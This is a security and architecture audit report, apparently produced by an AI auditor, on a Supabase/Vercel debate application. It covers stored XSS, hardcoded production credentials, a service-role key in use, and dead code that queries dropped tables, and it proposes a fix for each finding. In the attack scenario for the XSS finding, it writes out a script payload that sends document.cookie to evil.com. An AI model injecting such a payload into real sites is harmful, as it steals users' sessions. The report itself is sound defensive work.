# Phase 5 — Architectural Blindness Report

**Audit reference:** commit `f4a8571` (`fix: SYC-H-02 — rate limit /api/go-respond`)
**Audit date:** 2026-04-17
**Auditor:** Claude Sonnet 4.6 (fresh session, phases 0–4 loaded as context)
**Scope:** All API handlers (`api/`), key source modules (`src/`), SQL domain files, cross-module interaction surfaces

---

## Methodology

All steps from PROMPT 5 executed directly. Every finding grounded in file reads, grep output, or documented evidence from the Land Mine Map. Phase priors carried in:
- `tsconfig.json` excludes `src/` — type checker is a no-op for all application code
- Phase 4 HP-1: in-process rate limiter was per-Vercel-instance; fixed in current code via Upstash Redis (confirmed at `api/go-respond.js:14-20`)
- User note: `cast_auto_debate_vote` dedup question; ref code regex mismatch in `share.ts`

---

## Section 1 — Security Defaults

### SD-1 — Stored XSS via raw `preview.topic` in OG description (HIGH)

**Location:** `api/challenge.html.js:20,43,53`

The `escapeHtml` function in `api/challenge.helpers.js` correctly maps `& < > " '`. An escaped `topic` variable is created at line 13 and used correctly for visible body content (lines 154, 165). But `ogDesc` at line 20 references `preview.topic` directly — not the escaped variable — then embeds `ogDesc` unescaped inside HTML attribute strings on lines 43 and 53:

```
Line 13: const topic = escapeHtml(preview.topic || 'Open Debate');        <-- escaped
Line 20: const ogDesc = `"${preview.topic || 'Open Debate'}" — ...`;      <-- raw: BUG
Line 43: <meta property="og:description" content="${ogDesc}">
Line 53: <meta name="twitter:description" content="${ogDesc}">
```

The `ogTitle` on line 19 correctly uses the escaped `challenger` variable. Escaping discipline was applied inconsistently within the same function.

**Attack scenario:** Attacker creates a challenge with topic `"><script>fetch('https://evil.com?c='+document.cookie)</script><x `. The serverless function fetches this via `get_challenge_preview` and renders it into the HTML head without escaping. Every user who opens the challenge link executes the injected script. This is stored XSS — the payload lives in the challenge record and fires for all recipients. Any registered user who can create a challenge can exploit this.

**Fix — one token change in `api/challenge.html.js:20`:**
```
Before: const ogDesc = `"${preview.topic || 'Open Debate'}" — ${category}...`;
After:  const ogDesc = `"${topic}" — ${category}...`;
```

---

### SD-2 — Hardcoded production credentials as dev environment fallback (MEDIUM)

**Location:** `src/config.ts:56-57`; also `api/challenge.js:23`, `api/profile.js:23` (URL only)

```typescript
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL || 'https://faomczmipsccwbhpivmp.supabase.co';
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY || 'eyJhbGci...';
```

Any developer running `npm run dev` without a `.env` file silently connects to the live production database. There is no staging environment (Phase 0 confirmed). Auth operations, RPC calls, and data reads all target production.

**Attack scenario:** Developer testing a new RPC with a bug in a DELETE condition runs it against what they believe is a local database. The operation executes against production user records.

**Fix:** Replace hardcoded fallbacks with empty strings. Add an assertion in `config.ts` that throws during `npm run dev` if required env vars are absent.

---

### SD-3 — Service role key in `invite.js` where anon key suffices (MEDIUM)

**Location:** `api/invite.js:14,26`

```javascript
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
await supabase.rpc('record_invite_click', { p_ref_code: code, p_ip: ip, p_device_id: null });
```

`record_invite_click` is a SECURITY DEFINER RPC. SECURITY DEFINER functions execute with the definer's permissions regardless of the caller's role — the anon key provides identical results. Using the service role key in an externally-facing endpoint expands blast radius if the key is ever exposed.

**Attack scenario:** Vercel function environment leaks env vars (SSRF in a dependency, misconfigured team settings, accidental log output). The `SUPABASE_SERVICE_ROLE_KEY` grants the attacker full database access — reads, writes, RLS bypass — across all 43 tables.

**Fix:** Replace `SUPABASE_SERVICE_ROLE_KEY` with `SUPABASE_ANON_KEY` in `invite.js`.

---

### SD-4 — No rate limit on invite-click endpoint (LOW)

**Location:** `api/invite.js` (no rate-limiting code)

`GET /i/:code` makes a Supabase service-role RPC call on every request with no throttling.

**Attack scenario:** Attacker uses the victim's shared invite link to send thousands of requests to `/i/<code>`, inflating invite-click analytics for any user and potentially exhausting Supabase RPC call quotas.

---

## Section 2 — Identity Propagation

### Traced endpoint: `GET /i/:code` (`invite.js`) -> `record_invite_click`

**Entry:** `api/invite.js:17` — `handler(req, res)`
**Hop 1:** `req.query.code` validated against `/^[a-z0-9]{5}$/`
**Hop 2:** `createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY)` — identity becomes the **service role**, not the requesting visitor
**Hop 3:** `supabase.rpc('record_invite_click', { p_ref_code, p_ip, p_device_id: null })` — executes with service role privileges
**Final data access:** INSERT into invite analytics table

**IDENTITY-COLLAPSE flag:** `auth.uid()` inside `record_invite_click` returns `null` when called via service role. If the RPC has any `auth.uid()`-scoped logic (e.g., attributing a click to a referrer's record), it silently receives `null` and fails or writes a null attribution. The function SQL is not in the repo (Phase 0 blind spot 5: live schema is authoritative). This is a candidate IDENTITY-COLLAPSE that requires Supabase CLI access to fully resolve.

---

## Section 3 — Broken Invariants

### BI-1 — `cast_auto_debate_vote` RPC called in source but dropped from production (HIGH)

**Location:** `src/pages/auto-debate.vote.ts:55`

```typescript
const { data } = await sb.rpc('cast_auto_debate_vote', {
  p_debate_id: d.id, p_fingerprint: getFingerprint(), p_voted_for: side, p_user_id: null,
});
```

**Evidence from `THE-MODERATOR-LAND-MINE-MAP.md` (LM-211):**
```
auto_debates table (dropped from production)
auto_debate_votes table (dropped from production)
cast_auto_debate_vote RPC (dropped)
view_auto_debate RPC (dropped)
```

Session 249 dropped the entire auto-debate consumer plumbing from production. Source files `src/pages/auto-debate.ts`, `auto-debate.vote.ts`, `auto-debate.render.ts`, and `moderator-auto-debate.html` were not removed. In production, every vote interaction silently fails — the `catch {}` block swallows the error; the UI falls back to locally-optimistic counts with no database write. Users see a vote UI that appears to work but records nothing.

**On the carry-in question about server-side dedup beyond `p_fingerprint`:** The RPC is dropped, so dedup is moot for production. For completeness from the obsolete SQL snapshot: `cast_landing_vote` (the analogous function in `obsolete/supabase-deployed-functions-export.sql:828`) uses `ON CONFLICT (topic_slug, fingerprint)` — a database unique constraint — as its dedup. This is proper server-side dedup. However, the fingerprint is generated client-side with `Math.random()` at `src/pages/auto-debate.ts:59` and stored in localStorage. Any attacker who clears localStorage or sends the RPC directly bypasses the constraint by supplying a fresh fingerprint. The database deduplicates on the value received — it cannot detect the same physical user sending different values.

**Invariant violated:** "Deployed source matches live schema." The auto-debate subsystem is a tombstone in source that silently fails in production.

---

### BI-2 — `arena-lobby.ts` queries dropped `auto_debates` table (HIGH)

**Location:** `src/arena/arena-lobby.ts:199`

```typescript
const { data: autoData } = await sb!.from('auto_debates')
  .select('id, topic, side_a_label, side_b_label, score_a, score_b, status, created_at')
  .eq('status', 'active')
  .order('created_at', { ascending: false })
  .limit(10);
```

This is the fallback branch when `get_arena_feed` returns empty — the likeliest state during off-peak hours. Per LM-211, `auto_debates` was dropped from production. When this branch executes, Supabase PostgREST returns an error. The lobby falls through to `renderPlaceholderCards()`, showing an empty arena with no content and no user-visible error.

**Real production impact:** New users visiting during low-traffic periods see an empty arena lobby. The fallback that was meant to fill the feed with content is a silent failure already occurring in production.

---

### BI-3 — `arena-feed-spec-chat.ts` exposes `cleanupSpecChat()` not `destroy()` (LOW)

**Location:** `src/arena/arena-feed-spec-chat.ts:105,109`

**CLAUDE.md invariant:** "Every polling interval must be clearable via a `destroy()` function."

The exported clearing function is `cleanupSpecChat()`. The interval is cleared correctly inside it — the behavioral requirement is met. But a compliance grep for `export.*destroy` will miss this module, producing a false-negative in interval-leak audits.

---

### BI-4 — Ref code regex mismatch: `share.ts` accepts codes `invite.js` rejects (MEDIUM)

**Locations:**
- `src/share.ts:158`: `/^[a-zA-Z0-9_-]{4,20}$/` — uppercase, underscores, hyphens, 4-20 chars
- `api/invite.js:19`: `/^[a-z0-9]{5}$/` — lowercase only, exactly 5 chars

The invite system generates 5-character lowercase alphanumeric codes. `invite.js` enforces this on ingress. But `share.ts:handleDeepLink()` accepts the looser format and calls `attribute_signup` with whatever code it finds in `?ref=`. A user can navigate directly to `moderator-plinko.html?ref=UPPERCASE-LONG-CODE`, bypassing `invite.js`, and `share.ts` forwards it to `attribute_signup`.

If `attribute_signup` does not validate the ref code format server-side (SQL not visible in repo), invalid codes could corrupt invite attribution records or be used to probe the `invite_codes` table by observing whether `attribute_signup` error responses differ for valid vs. invalid codes.

**Fix:** Change `src/share.ts:158` from `/^[a-zA-Z0-9_-]{4,20}$/` to `/^[a-z0-9]{5}$/`.

---

## Section 4 — Duplicated Utilities

### DU-1 — `getFingerprint()` identically implemented in two source files (MEDIUM)

**Locations:**
- `src/pages/auto-debate.ts:56-62`
- `src/pages/debate-landing.data.ts:95-101`

Both use localStorage key `col_fp`, same format `fp_` + `Math.random()...` + `Date.now()`, identical logic. The duplication is currently harmless — both pages share state because they share the key. A future change to the format or key name in one file and not the other silently diverges fingerprint behavior between the two pages.

**Fix:** Extract to `src/config.ts` and import from both pages.

---

### DU-2 — Supabase URL hardcoded fallback duplicated in two API files (LOW)

**Locations:** `api/challenge.js:23`, `api/profile.js:23`

```javascript
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://faomczmipsccwbhpivmp.supabase.co';
```

Serverless functions cannot share a module without bundling. Each independently hardcodes the production URL. A Supabase project migration requires three synchronized edits: both `api/` files and `src/config.ts`.

---

## Section 5 — Scaling Risks

### SR-1 — `auth.follows.ts` fetches all follower/following rows without LIMIT (MEDIUM)

**Location:** `src/auth.follows.ts:40,54`

```typescript
.select('follower_id, profiles!follows_follower_id_fkey(username, display_name, elo_rating)', { count: 'exact' })
// no .limit()
```

Fetches all follow relationships for a user in one query with joined profile data. The `{ count: 'exact' }` option forces a full count scan. PostgREST default cap (1000 rows) may silently truncate data while reporting the full count, creating display inconsistency (count shows 5000, list shows 1000).

**Attack scenario:** A high-follower-count user's profile page triggers a query returning thousands of joined rows. The browser receives a multi-megabyte JSON payload, causing the page to hang or the tab to crash.

---

### SR-2 — `api/profile.js` in-memory cache not shared across Vercel instances (LOW)

**Location:** `api/profile.js:30`

```javascript
const profileCache = new Map(); // per-instance
```

Same structural multi-instance limitation as Phase 4 HP-1. Under load, each Vercel instance runs cold-cache queries against Supabase. The HTTP-layer `Cache-Control: public, s-maxage=300` header provides stronger protection than this in-memory cache. Performance concern, not a correctness bug.

---

### SR-3 — `groups.challenges.ts` group query without LIMIT (LOW)

**Location:** `src/pages/groups.challenges.ts:67`

Returns all groups with no pagination or limit. Pre-launch scale concern.

---

## Section 6 — Concurrency Risks

### CR-1 — No Anthropic API timeout in `go-respond.js` (MEDIUM, pre-existing)

**Location:** `api/go-respond.js` — both `fetch()` calls to `CLAUDE_API_URL`

Neither the scoring nor debate-round path uses `AbortController`. A hung Anthropic API call holds the Vercel function until platform timeout (10s Hobby / 60s Pro). The Upstash rate limiter charges the IP slot before the hang resolves — under a degraded Anthropic API, hung requests fill the per-IP rate-limit allowance, blocking legitimate subsequent requests from the same IP until the window clears.

This finding was raised in Phase 4 as DB-2 and is still present in the updated `go-respond.js`.

**Fix:**
```javascript
const abortCtrl = new AbortController();
const timeoutId = setTimeout(() => abortCtrl.abort(), 9000);
// Add signal: abortCtrl.signal to both fetch() calls
// Add clearTimeout(timeoutId) in finally blocks
```

---

### CR-2 — `invite.js` creates new Supabase client per request (LOW)

**Location:** `api/invite.js:26`

```javascript
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY); // inside handler body
```

New client instance initialized on every request. Should be at module scope.

---

## Section 7 — Environment Parity

### EP-1 — Dev environment silently targets production Supabase (HIGH)

**Location:** `src/config.ts:56-57` (same as SD-2, examined from the env-parity lens)

No staging environment exists (Phase 0 confirmed). The hardcoded fallback values mean the first code execution by any developer on any machine without a `.env` file is against production. Combined with Phase 1's finding that `tsconfig.json` excludes `src/`, the development safety posture is: no type checking + no staging isolation + no CI pipeline. Production is the first test environment.

---

### EP-2 — Stripe edge function URL fully hardcoded with project ID (LOW)

**Location:** `src/config.ts:67`

```typescript
const STRIPE_FUNCTION_URL = 'https://faomczmipsccwbhpivmp.supabase.co/functions/v1/create-checkout-session' as const;
```

No `import.meta.env` path. Supabase project migration or edge function rename requires source edit, build, and deploy.

---

## Findings Summary

| ID | Section | Finding | Severity |
|---|---|---|---|
| SD-1 | Security Defaults | Stored XSS: raw `preview.topic` in OG description — `api/challenge.html.js:20` | **HIGH** |
| BI-1 | Broken Invariants | `cast_auto_debate_vote` RPC called in source but dropped from production (LM-211) | **HIGH** |
| BI-2 | Broken Invariants | `arena-lobby.ts:199` queries dropped `auto_debates` table — silent failure in production | **HIGH** |
| EP-1 | Environment Parity | Dev env targets production Supabase — no staging, no isolation, no guard | **HIGH** |
| SD-2 | Security Defaults | Production credentials hardcoded as fallback in `src/config.ts:56-57` | **MEDIUM** |
| SD-3 | Security Defaults | Service role key in `invite.js` where anon key + SECURITY DEFINER suffices | **MEDIUM** |
| IP-1 | Identity Propagation | `invite.js` IDENTITY-COLLAPSE candidate: service role acts as itself, not as visitor | **MEDIUM** |
| BI-4 | Broken Invariants | Ref code regex mismatch — `share.ts` accepts codes `invite.js` rejects | **MEDIUM** |
| DU-1 | Duplicated Utilities | `getFingerprint()` identically implemented in two source files | **MEDIUM** |
| SR-1 | Scaling Risks | `auth.follows.ts` fetches all follower rows without LIMIT | **MEDIUM** |
| CR-1 | Concurrency Risks | No Anthropic API timeout in `go-respond.js` (Phase 4 DB-2, still present) | **MEDIUM** |
| SD-4 | Security Defaults | No rate limit on `api/invite.js` — click inflation, quota exhaustion | **LOW** |
| BI-3 | Broken Invariants | `cleanupSpecChat()` not named `destroy()` — violates CLAUDE.md polling invariant | **LOW** |
| DU-2 | Duplicated Utilities | Supabase URL hardcoded fallback duplicated in `api/challenge.js` and `api/profile.js` | **LOW** |
| SR-2 | Scaling Risks | `api/profile.js` in-memory cache not shared across Vercel instances | **LOW** |
| SR-3 | Scaling Risks | `groups.challenges.ts` group query missing LIMIT | **LOW** |
| CR-2 | Concurrency Risks | `invite.js` creates new Supabase client inside handler — should be at module scope | **LOW** |
| EP-2 | Environment Parity | Stripe edge function URL fully hardcoded with project ID — no env-var override | **LOW** |

---

## Highest-Priority Fix

**SD-1** is the only actively exploitable finding in this phase. A single token change in `api/challenge.html.js:20` (replace `preview.topic` with the already-escaped `topic` variable) closes a stored XSS that any registered user can trigger against any link recipient.

BI-1 and BI-2 represent silent production failures already occurring — auto-debate votes record nothing, the arena lobby shows empty placeholders during off-peak hours. Both require removing or guarding the dead code paths against the dropped schema.

EP-1 requires a `.env.example` file and removal of hardcoded fallbacks to establish minimum dev environment isolation.

---

## Prior Phase Cross-Reference

| This Phase | Prior Phase | Connection |
|---|---|---|
| SD-1 (XSS via raw topic) | Phase 3 UP-3 (numeric casting violations) | Same pattern: escape helper exists and is called elsewhere in the same function, but the raw value is used in one branch |
| CR-1 (no API timeout) | Phase 4 DB-2 | Identical finding — unchanged in the updated code |
| SR-2 (per-instance cache) | Phase 4 HP-1 (per-instance rate limiter) | Rate limiter fixed with Upstash; in-memory cache has same structural issue at lower severity |
| BI-1, BI-2 (dropped tables/RPCs) | Phase 0 (auto-debate scratch documented) | Phase 0 noted the S249 drop; Phase 5 confirms source was not updated to match |

---

*Phase 5 complete. Do not proceed to Phase 6 without user review.*
